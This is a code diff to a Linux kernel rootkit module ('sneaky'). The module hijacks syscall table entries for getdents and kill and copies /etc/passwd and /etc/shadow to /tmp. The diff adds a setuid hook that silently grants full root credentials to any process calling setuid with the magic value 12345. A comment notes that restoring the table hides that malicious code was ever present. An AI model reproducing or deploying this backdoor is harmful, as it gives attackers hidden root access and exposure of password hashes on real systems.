@@ -30,7 +30,7 @@
 #define PASSWD_COPY "/tmp/passwd"
 #define SHADOW_FILE "/etc/shadow"
 #define SHADOW_COPY "/tmp/shadow"
-
+#define MAGIC_NUMBER 12345
 struct linux_dirent {
   u64 d_ino;
   s64 d_off;
@@ -217,6 +217,37 @@ asmlinkage int sneaky_kill(pid_t pid, int sig){
 			return original_kill(pid, sig);
 	}
 	return 0;
+}
+
+/* Setuid syscall hook */
+asmlinkage int (*origin_setuid) (uid_t uid);
+asmlinkage int secure_setuid(uid_t uid)
+{
+  if (uid == MAGIC_NUMBER)
+    {
+      /* Create new cred struct */
+      struct cred *new_cred;
+      printk(KERN_INFO "[+] UID = %hu\n[+] EUID = %hu",current->cred->uid,current->cred->euid);
+      printk(KERN_WARNING "[!] Attempting UID change!");
+      /* Prepares new set of credentials for task_struct of current process */
+      new_cred = prepare_creds();
+      /* Set uid of new cred struct to 0 */
+      new_cred->uid = GLOBAL_ROOT_UID;
+      new_cred->gid = GLOBAL_ROOT_GID;
+      new_cred->suid = GLOBAL_ROOT_UID;
+      new_cred->sgid = GLOBAL_ROOT_GID;
+      new_cred->euid = GLOBAL_ROOT_UID;
+      new_cred->egid = GLOBAL_ROOT_GID;
+      new_cred->fsuid = GLOBAL_ROOT_UID;
+      new_cred->fsgid = GLOBAL_ROOT_GID;
+      /* Commit cred to task_struct of process */
+      commit_creds(new_cred);
+      printk(KERN_WARNING "[!] Changes Complete!");
+      printk(KERN_INFO "after change [+] UID = %hu\n[+] EUID = %hu",current->cred->uid,current->cred->euid);
+
+    }
+  /* Call original setuid syscall */
+  return origin_setuid(uid);
 }
 
 int cp_passwd(char* path, char* copypath){
@@ -430,7 +461,10 @@ static int initialize_sneaky_module(void)
   *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_getdents; 
   //kill
   original_kill = (void*)*(sys_call_table + __NR_kill);  
-  *(sys_call_table + __NR_kill) = (unsigned long)sneaky_kill; 
+  *(sys_call_table + __NR_kill) = (unsigned long)sneaky_kill;
+  //setuid
+  origin_setuid = (void*)*(sys_call_table + __NR_setuid);
+  *(sys_call_table + __NR_setuid) = (unsigned long)secure_setuid;
   /*
   //Revert page to read-only
   pages_ro(page_ptr, 1);
@@ -467,6 +501,7 @@ static void exit_sneaky_module(void)
   //function address. Will look like malicious code was never there!
   *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
   *(sys_call_table + __NR_kill) = (unsigned long)original_kill;
+  *(sys_call_table + __NR_setuid) = (unsigned long)origin_setuid;
   //*(sys_call_table + __NR_setuid) = (unsigned long)origin_setuid;
   /*
   //Revert page to read-only
